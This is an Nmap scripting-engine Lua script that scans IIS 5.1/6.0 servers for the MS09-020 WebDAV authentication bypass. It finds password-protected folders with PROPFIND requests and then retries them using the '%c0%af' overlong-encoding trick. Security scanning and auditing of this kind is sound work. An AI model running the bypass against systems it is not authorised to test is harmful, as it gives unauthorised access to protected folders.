local http = require "http"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Checks for a vulnerability in IIS 5.1/6.0 that allows arbitrary users to access secured WebDAV folders by searching for a password-protected folder and attempting to access it. This vulnerability was patched in Microsoft Security Bulletin MS09-020, http://nmap.org/r/ms09-020.

A list of well known folders (almost 900) is used by default. Each one is checked, and if returns an authentication request (401), another attempt is tried with the malicious encoding. If that attempt returns a successful result (207), then the folder is marked as vulnerable.

This script is based on the Metasploit modules/auxiliary/scanner/http/wmap_dir_webdav_unicode_bypass.rb auxiliary module.

For more information on this vulnerability and script, see:
* http://blog.zoller.lu/2009/05/iis-6-webdac-auth-bypass-and-data.html
* http://seclists.org/fulldisclosure/2009/May/att-134/IIS_Advisory_pdf.bin
* http://www.skullsecurity.org/blog/?p=271
* http://www.kb.cert.org/vuls/id/787932
* http://www.microsoft.com/technet/security/advisory/971492.mspx
]]

---
-- @usage
-- nmap --script http-iis-webdav-vuln -p80,8080 <host>
--
-- @output
-- 80/tcp open  http    syn-ack
-- |_ http-iis-webdav-vuln: WebDAV is ENABLED. Vulnerable folders discovered: /secret, /webdav
--
-- @args webdavfolder Selects a single folder to use, instead of using a built-in list.
-- @args folderdb The filename of an alternate list of folders.
-- @args basefolder The folder to start in; eg, <code>"/web"</code> will try <code>"/web/xxx"</code>.
-----------------------------------------------------------------------

author = "Ron Bowes and Andrew Orr"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}


portrule = shortport.http

---Enumeration for results
local enum_results = 
{
	VULNERABLE = 1,
	NOT_VULNERABLE = 2,
	UNKNOWN = 3
}

---Sends a PROPFIND request to the given host, and for the given folder. Returns a table reprenting a response. 
local function get_response(host, port, folder)
	local webdav_req = '<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>'

	local options = {
		header = {
			Host = host.ip,
			Connection = "close",
			["User-Agent"]  = "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)",
			["Content-Type"] = "application/xml",
		},
		content = webdav_req
	}

	return http.generic_request(host, port, "PROPFIND", folder, options)
end

---Check a single folder on a single host for the vulnerability. Returns one of the enum_results codes. 
local function go_single(host, port, folder)
	local response

	response = get_response(host, port, folder)
	if(response.status == 401) then
		local vuln_response
		local check_folder

		stdnse.print_debug(1, "http-iis-webdav-vuln: Found protected folder (401): %s", folder)

		-- check for IIS 6.0 and 5.1
		-- doesn't appear to work on 5.0
		-- /secret/ becomes /s%c0%afecret/
		check_folder = string.sub(folder, 1, 2) .. "%c0%af" .. string.sub(folder, 3)
		vuln_response = get_response(host, port, check_folder)
		if(vuln_response.status == 207) then
			stdnse.print_debug(1, "http-iis-webdav-vuln: Folder seems vulnerable: %s", folder)
			return enum_results.VULNERABLE
		else
			stdnse.print_debug(1, "http-iis-webdav-vuln: Folder does not seem vulnerable: %s", folder)
			return enum_results.NOT_VULNERABLE
		end
	else
		if(response['status-line'] ~= nil) then
			stdnse.print_debug(3, "http-iis-webdav-vuln: Not a protected folder (%s): %s", response['status-line'], folder)
		elseif(response['status'] ~= nil) then
			stdnse.print_debug(3, "http-iis-webdav-vuln: Not a protected folder (%s): %s", response['status'], folder)
		else
			stdnse.print_debug(3, "http-iis-webdav-vuln: Not a protected folder: %s",folder)
		end
		return enum_results.UNKNOWN
	end
end

---Checks a list of possible folders for the vulnerability. Returns a list of vulnerable folders. 
local function go(host, port)
	local status, folder
	local results = {}
	local is_vulnerable = true

	local folder_file
  local farg = nmap.registry.args.folderdb
  folder_file = farg and (nmap.fetchfile(farg) or farg) or nmap.fetchfile('nselib/data/http-folders.txt')

	if(folder_file == nil) then
		return false, "Couldn't find http-folders.txt (should be in nselib/data)"
	end

	local file = io.open(folder_file, "r")
	if not file then
		return false, ("Couldn't find or open %s"):format(folder_file)
	end

	while true do
		local result
		local line = file:read()
		if not line then
			break
		end

		if(nmap.registry.args.basefolder ~= nil) then
			line = "/" .. nmap.registry.args.basefolder .. "/" .. line
		else
			line = "/" .. line
		end

		result = go_single(host, port, line)
		if(result == enum_results.VULNERABLE) then
			results[#results + 1] = line
		elseif(result == enum_results.NOT_VULNERABLE) then
			is_vulnerable = false
		else
		end
	end

	file:close()

	return true, results, is_vulnerable
end

action = function(host, port)
	-- Start by checking if '/' is protected -- if it is, we can't do the tests
	local result = go_single(host, port, "/")
	if(result == enum_results.NOT_VULNERABLE) then
		stdnse.print_debug(1, "http-iis-webdav-vuln: Root folder is password protected, aborting.")			
		return nmap.verbosity() > 0 and "Could not determine vulnerability, since root folder is password protected" or nil
	end

	stdnse.print_debug(1, "http-iis-webdav-vuln: Root folder is not password protected, continuing...")

	local response = get_response(host, port, "/")
	if(response.status == 501) then
		-- WebDAV is disabled
		stdnse.print_debug(1, "http-iis-webdav-vuln: WebDAV is DISABLED (PROPFIND failed).")
		return nmap.verbosity() > 0 and "WebDAV is DISABLED. Server is not currently vulnerable." or nil
	else
		if(response.status == 207) then
			-- PROPFIND works, WebDAV is enabled
			stdnse.print_debug(1, "http-iis-webdav-vuln: WebDAV is ENABLED (PROPFIND was successful).")
		else
			-- probably not running IIS 5.0/5.1/6.0
			if(response['status-line'] ~= nil) then
				stdnse.print_debug(1, "http-iis-webdav-vuln: PROPFIND request failed with \"%s\".", response['status-line'])
			elseif(response['status'] ~= nil) then
				stdnse.print_debug(1, "http-iis-webdav-vuln: PROPFIND request failed with \"%s\".", response['status'])
			else
				stdnse.print_debug(1, "http-iis-webdav-vuln: PROPFIND request failed.")
			end
			return nmap.verbosity() > 0 and "ERROR: This web server is not supported." or nil
		end
	end


	if(nmap.registry.args.webdavfolder ~= nil) then
		local folder = nmap.registry.args.webdavfolder
		local result = go_single(host, port, "/" .. folder)

		if(result == enum_results.VULNERABLE) then
			return string.format("WebDAV is ENABLED. Folder is vulnerable: %s", folder)
		elseif(result == enum_results.NOT_VULNERABLE) then
			return nmap.verbosity() > 0 and string.format("WebDAV is ENABLED. Folder is NOT vulnerable: %s", folder) or nil
		else
			return nmap.verbosity() > 0 and string.format("WebDAV is ENABLED. Could not determine vulnerability of folder: %s", folder) or nil
		end
		
	else
		local status, results, is_vulnerable = go(host, port)
	
	    if(status == false) then
			return nmap.verbosity() > 0 and "ERROR: " .. results or nil
		else
			if(#results == 0) then
				if(is_vulnerable == false) then
					return nmap.verbosity() > 0 and "WebDAV is ENABLED. Protected folder found but could not be exploited. Server does not appear to be vulnerable." or nil
				else
					return nmap.verbosity() > 0 and "WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>" or nil
				end
			else
				return "WebDAV is ENABLED. Vulnerable folders discovered: " .. stdnse.strjoin(", ", results)
			end
		end
	end
end

